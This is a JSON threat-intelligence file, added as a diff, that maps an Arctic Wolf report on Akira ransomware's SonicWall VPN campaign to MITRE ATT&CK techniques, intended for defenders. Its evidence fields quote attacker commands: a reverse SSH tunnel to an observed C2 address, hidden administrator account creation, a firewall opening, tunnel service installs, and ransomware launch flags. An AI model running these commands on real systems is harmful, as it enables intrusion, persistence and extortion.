@@ -1,0 +1,276 @@
+{
+  "source": "Arctic Wolf Labs — Smash and Grab: Aggressive Akira Campaign Targets SonicWall VPNs",
+  "url": "https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/",
+  "published": "2025-09-26",
+  "threat_actor": "Akira Ransomware (multiple affiliates)",
+  "campaign_start": "2025-07-21",
+  "cve_referenced": "CVE-2024-40766",
+  "technique_count": 35,
+  "techniques": [
+    {
+      "tactic": "Initial Access",
+      "technique_id": "T1133",
+      "technique_name": "External Remote Services",
+      "evidence": "Threat actors gained initial access through SonicWall SSL VPN logins originating from VPS hosting providers. Both local firewall accounts and LDAP-synchronized AD accounts were targeted, including LDAP sync service accounts not intended for VPN access.",
+      "tools_observed": ["SonicWall SSL VPN client"]
+    },
+    {
+      "tactic": "Initial Access",
+      "technique_id": "T1078",
+      "technique_name": "Valid Accounts",
+      "evidence": "Credentials likely harvested earlier via CVE-2024-40766 were used to authenticate — even against patched devices. Repeated malicious SSL VPN logins observed on accounts with OTP MFA enabled. Evidence points to use of valid credentials rather than modification of OTP configuration.",
+      "tools_observed": []
+    },
+    {
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "evidence": "SonicWall links the campaign to CVE-2024-40766 (improper access control) affecting SonicOS 5, 6, and 7. Exploitation could enable abuse of administrative functions such as configuration backup, creating opportunities for credential theft. SonicWall NSa and TZ series devices running SonicOS 6 and 7 were affected.",
+      "tools_observed": []
+    },
+    {
+      "tactic": "Initial Access",
+      "technique_id": "T1110",
+      "technique_name": "Brute Force",
+      "evidence": "SonicWall confirmed devices running SonicOS prior to 7.3 may have been susceptible to brute force attacks affecting MFA credentials. Black Basta affiliates also known to conduct online brute-force campaigns against live firewall appliances. Evenly spaced periodic login activity across multiple accounts suggests automated authentication.",
+      "tools_observed": ["Automated scripting"]
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell",
+      "evidence": "PowerShell used extensively: Get-ADUser and Get-ADComputer for AD enumeration, Invoke-WebRequest/WebClient for tool downloads (AnyDesk, cloudflared), custom PowerShell scripts for Veeam credential extraction (supporting MSSQL and PostgreSQL), New-NetFirewallRule for firewall modification.",
+      "tools_observed": ["PowerShell", "Invoke-WebRequest", "System.Net.WebClient"]
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "evidence": "cmd.exe used throughout the kill chain: net user/net localgroup for account creation, quser for session discovery (with WMIExec-style randomized output filenames), sc create for service installation, SSH tunnel initiation.",
+      "tools_observed": ["cmd.exe", "net.exe"]
+    },
+    {
+      "tactic": "Execution",
+      "technique_id": "T1047",
+      "technique_name": "Windows Management Instrumentation",
+      "evidence": "Evidence of Impacket WMIExec usage — quser commands with output redirected to filenames with six-character randomized strings in mixed case, a signature consistent with WMIExec. Command: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOMIZED_STRING 2>&1'",
+      "tools_observed": ["Impacket WMIExec"]
+    },
+    {
+      "tactic": "Persistence",
+      "technique_id": "T1136.001",
+      "technique_name": "Create Account: Local Account",
+      "evidence": "Threat actors created local administrator accounts using net.exe on VM backup servers (Veeam) and Windows servers related to VM administration. Account names designed to blend in: 'sqlbackup', 'veean'. Commands: 'net user sqlbackup REDACTED /add' followed by 'net localgroup administrators sqlbackup /add'.",
+      "tools_observed": ["net.exe"]
+    },
+    {
+      "tactic": "Persistence",
+      "technique_id": "T1136.002",
+      "technique_name": "Create Account: Domain Account",
+      "evidence": "Threat actors created domain accounts and elevated some to administrative groups like 'ESX Admins'. These accounts were used for data exfiltration and RMM tool installation. Command: 'net group \"ESX Admins\" REDACTED_USERNAME /domain /add'.",
+      "tools_observed": ["net.exe"]
+    },
+    {
+      "tactic": "Persistence",
+      "technique_id": "T1219",
+      "technique_name": "Remote Access Software",
+      "evidence": "Multiple RMM tools deployed for persistent remote access: AnyDesk downloaded via PowerShell to C:\\ProgramData\\AnyDesk.exe, TeamViewer installed, RustDesk installed via batch script and registered as a Windows service using 'sc create RustDesk' with auto-start configuration.",
+      "tools_observed": ["AnyDesk", "TeamViewer", "RustDesk"]
+    },
+    {
+      "tactic": "Persistence",
+      "technique_id": "T1543.003",
+      "technique_name": "Create or Modify System Process: Windows Service",
+      "evidence": "RustDesk registered as a persistent service: 'sc create RustDesk binpath= \"C:\\Program Files\\RustDesk\\RustDesk.exe\" --import-config ... start= auto DisplayName= \"RustDesk Service\"'. Cloudflared also installed as a service: 'cloudflared.exe service install REDACTED_TOKEN'.",
+      "tools_observed": ["sc.exe", "cloudflared"]
+    },
+    {
+      "tactic": "Persistence",
+      "technique_id": "T1098",
+      "technique_name": "Account Manipulation",
+      "evidence": "Newly created accounts elevated to privileged groups: local Administrators group via 'net localgroup administrators', and domain ESX Admins group via 'net group'. Accounts were then used for lateral movement, exfiltration, and RMM tool installation.",
+      "tools_observed": ["net.exe"]
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1562.001",
+      "technique_name": "Impair Defenses: Disable or Modify Tools",
+      "evidence": "Threat actors disabled legitimate RMM tools and EDR tools prior to ransomware deployment. Microsoft Defender was disabled. This was part of the systematic defense evasion phase before impact actions.",
+      "tools_observed": []
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1562.004",
+      "technique_name": "Impair Defenses: Disable or Modify System Firewall",
+      "evidence": "Host-based firewall rules modified to allow inbound SSH: 'New-NetFirewallRule -Name sshd -DisplayName \"OpenSSH Server (sshd)\" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22'. OpenSSH configured to listen on 0.0.0.0 wildcard address.",
+      "tools_observed": ["PowerShell New-NetFirewallRule"]
+    },
+    {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070.001",
+      "technique_name": "Indicator Removal: Clear Windows Event Logs",
+      "evidence": "Event logs were cleared as part of the systematic defense evasion phase prior to ransomware deployment, mapped to Windows internals.",
+      "tools_observed": []
+    },
+    {
+      "tactic": "Credential Access",
+      "technique_id": "T1555",
+      "technique_name": "Credentials from Password Stores",
+      "evidence": "Custom PowerShell script extracted encrypted credentials from Veeam Backup & Replication database (versions 11 and 12), supporting both MSSQL and PostgreSQL backends. Script decrypted DPAPI secrets and newer Base64-encoded formats, retrieved encryption salts from multiple filesystem locations. Also: sqlcmd used to query VeeamBackup.dbo.Credentials table directly.",
+      "tools_observed": ["Custom Veeam credential extraction PowerShell script", "sqlcmd"]
+    },
+    {
+      "tactic": "Credential Access",
+      "technique_id": "T1003",
+      "technique_name": "OS Credential Dumping",
+      "evidence": "Threat actors sought access to VM storage and domain controller filesystems to obtain domain credentials. Veeam credential extraction included DPAPI secret decryption on local machine. AD data exfiltration via wbadmin.exe observed in related reporting.",
+      "tools_observed": ["Custom PowerShell scripts", "wbadmin.exe"]
+    },
+    {
+      "tactic": "Credential Access",
+      "technique_id": "T1111",
+      "technique_name": "Multi-Factor Authentication Interception",
+      "evidence": "Threat actors successfully authenticated against accounts with OTP MFA enabled. SonicWall confirmed that if OTP seeds are obtained, they can be used to generate valid OTP tokens. Google Threat Intelligence Group uncovered a related campaign demonstrating OTP seed theft on SonicWall SMA devices.",
+      "tools_observed": []
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1046",
+      "technique_name": "Network Service Discovery",
+      "evidence": "Internal scanning initiated within 5 minutes of VPN login. Scanned ports: 135 (RPC), 137 (NetBIOS), 445 (SMB), 1433 (SQL). Tools deployed to Windows servers under %Temp%, Downloads, or Desktop directories.",
+      "tools_observed": ["SoftPerfect Network Scanner", "Advanced IP Scanner", "Impacket"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1087.002",
+      "technique_name": "Account Discovery: Domain Account",
+      "evidence": "AD user enumeration via 'Get-ADUser -Filter * -Properties *' selecting Enabled, Name, SamAccountName, MemberOf, PasswordLastSet, LastLogonDate, etc., output to C:\\ProgramData\\AdUsers.txt. Also via nltest and dsquery. BloodHound and ldapdomaindump used for further enumeration.",
+      "tools_observed": ["PowerShell Get-ADUser", "nltest", "dsquery", "BloodHound", "ldapdomaindump"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1018",
+      "technique_name": "Remote System Discovery",
+      "evidence": "AD computer enumeration via 'Get-ADComputer -Filter * -Property *' selecting Name, DNSHostName, IPv4Address, OperatingSystem, servicePrincipalName, output to C:\\ProgramData\\REDACTED_Comps.txt. Network scanners also used for host discovery.",
+      "tools_observed": ["PowerShell Get-ADComputer", "Advanced IP Scanner", "SoftPerfect Network Scanner"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1135",
+      "technique_name": "Network Share Discovery",
+      "evidence": "SharpShares (multi-threaded AD reconnaissance tool) used with LDAP-based enumeration: 'SharpShares.exe /ldap:all /filter:netlogon,ipc$,print$ /threads:1000 /outfile:C:\\programdata\\tb.txt'. Output reviewed in Notepad.",
+      "tools_observed": ["SharpShares"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1069.002",
+      "technique_name": "Permission Groups Discovery: Domain Groups",
+      "evidence": "BloodHound used for AD relationship and permission group enumeration. MemberOf attribute explicitly collected in Get-ADUser queries. ESX Admins group targeted for privilege escalation.",
+      "tools_observed": ["BloodHound", "PowerShell Get-ADUser", "NetExec"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "evidence": "quser command executed via WMIExec to identify logged-in users on target systems. Command: 'cmd.exe /Q /c quser 1> \\Windows\\Temp\\RANDOMIZED_STRING 2>&1'. Six-character randomized output filename is a WMIExec signature.",
+      "tools_observed": ["quser", "Impacket WMIExec"]
+    },
+    {
+      "tactic": "Discovery",
+      "technique_id": "T1482",
+      "technique_name": "Domain Trust Discovery",
+      "evidence": "ldapdomaindump used for LDAP enumeration and domain trust discovery. nltest also used for domain controller enumeration and trust relationships.",
+      "tools_observed": ["ldapdomaindump", "nltest"]
+    },
+    {
+      "tactic": "Lateral Movement",
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "evidence": "RDP was the primary tool for lateral movement through compromised environments. RDP login activity observed via Windows event ID 4624 (logon type 10). Used after initial discovery phase to move between servers.",
+      "tools_observed": ["RDP"]
+    },
+    {
+      "tactic": "Lateral Movement",
+      "technique_id": "T1021.002",
+      "technique_name": "Remote Services: SMB/Windows Admin Shares",
+      "evidence": "SMBv2 session setup requests exhibited signature consistent with Python Impacket library. Hostnames observed: kali, WIN, DESKTOP-HPLM2TD, WINUTIL, DESKTOP-A2S6P81, WIN-V1L65ED9I55, WIN-5VVC95LFP2G, DESKTOP-EDE0RR5. Failed (4625) and successful (4624) SMB logon type 3 events observed.",
+      "tools_observed": ["Impacket", "SMB"]
+    },
+    {
+      "tactic": "Lateral Movement",
+      "technique_id": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "evidence": "SSH reverse tunnels used for persistent access: 'ssh -R 5555 root@170.130.165[.]42'. OpenSSH service configured to listen on 0.0.0.0. Cloudflared installed under C:\\ProgramData\\ssh to provide SSH access via Cloudflare Tunnel from domain controllers.",
+      "tools_observed": ["OpenSSH", "cloudflared"]
+    },
+    {
+      "tactic": "Command and Control",
+      "technique_id": "T1572",
+      "technique_name": "Protocol Tunneling",
+      "evidence": "SSH reverse tunnels ('ssh -R 5555 root@170.130.165[.]42') and Cloudflare Tunnels (cloudflared) used to bypass NAT and establish C2 channels. Cloudflared ran from AD domain controllers under C:\\ProgramData\\ssh, installed as a persistent service with 'cloudflared.exe service install'. Automated PowerShell installation scripts observed with comments about fallback download URLs.",
+      "tools_observed": ["SSH", "cloudflared (Cloudflare Tunnel client)"]
+    },
+    {
+      "tactic": "Command and Control",
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "evidence": "Tools downloaded to compromised systems: AnyDesk via PowerShell WebClient.DownloadFile to C:\\ProgramData\\AnyDesk.exe. Cloudflared downloaded using Invoke-WebRequest with fallback URLs. SoftPerfect Network Scanner and Advanced IP Scanner deployed to %Temp%, Downloads, or Desktop directories. RustDesk deployed via batch script.",
+      "tools_observed": ["PowerShell Invoke-WebRequest", "System.Net.WebClient", "Start-BitsTransfer"]
+    },
+    {
+      "tactic": "Collection",
+      "technique_id": "T1560.001",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "evidence": "WinRAR used to compress data for exfiltration with split archive switches (-v3g) to create 3GB volumes. Files filtered by recency and business relevance: general folders limited to 6 months of data, while HR and accounts payable folders had up to 30 months exfiltrated.",
+      "tools_observed": ["WinRAR"]
+    },
+    {
+      "tactic": "Collection",
+      "technique_id": "T1074",
+      "technique_name": "Data Staged",
+      "evidence": "Data staged for exfiltration using WinRAR archives with consistent command-line syntax across multiple compromised hosts. Only source/target drive letters varied between hosts. Archives prepared in staging directories before transfer.",
+      "tools_observed": ["WinRAR"]
+    },
+    {
+      "tactic": "Exfiltration",
+      "technique_id": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol",
+      "evidence": "Data exfiltrated via FileZilla SFTP client, rclone, and SSH transfers to VPS endpoints controlled by threat actors. Multiple exfiltration methods observed across different affiliates.",
+      "tools_observed": ["FileZilla", "rclone", "SSH"]
+    },
+    {
+      "tactic": "Impact",
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact",
+      "evidence": "Akira ransomware deployed using drive-scoped commands: 'akira.exe -n=1 -p=D:\\' and share lists '-s=share.txt'. Both Akira and Akira_v2 (Megazord/Rust-based) encryptors observed. Entire kill chain from VPN login to encryption completed in under 4 hours, with some as fast as 55 minutes.",
+      "tools_observed": ["akira.exe", "Akira_v2 / Megazord"]
+    },
+    {
+      "tactic": "Impact",
+      "technique_id": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "evidence": "Volume Shadow Copy Service copies deleted via vssadmin.exe prior to ransomware deployment, preventing system recovery from local snapshots. Standard Akira pre-encryption preparation.",
+      "tools_observed": ["vssadmin.exe"]
+    }
+  ],
+  "kill_chain_summary": {
+    "initial_access": "SSL VPN login via stolen credentials (CVE-2024-40766) with MFA bypass",
+    "time_to_discovery": "< 5 minutes post-login",
+    "time_to_lateral_movement": "< 10 minutes post-login",
+    "time_to_encryption": "55 minutes to 4 hours",
+    "dwell_time": "Hours, not days — among the shortest recorded for ransomware"
+  },
+  "infrastructure": {
+    "vpn_source": "VPS hosting providers (rotating infrastructure)",
+    "c2_ip_observed": "170.130.165.42 (SSH reverse tunnel)",
+    "vpn_login_ip_observed": "38.114.123.167",
+    "tools_deployed_paths": [
+      "C:\\ProgramData\\AnyDesk.exe",
+      "C:\\ProgramData\\ssh\\cloudflared.exe",
+      "C:\\Program Files\\RustDesk\\RustDesk.exe",
+      "C:\\ProgramData\\AdUsers.txt",
+      "C:\\ProgramData\\SharpShares output (tb.txt)",
+      "%Temp%\\Advanced IP Scanner 2\\advanced_ip_scanner.exe"
+    ]
+  }
+}
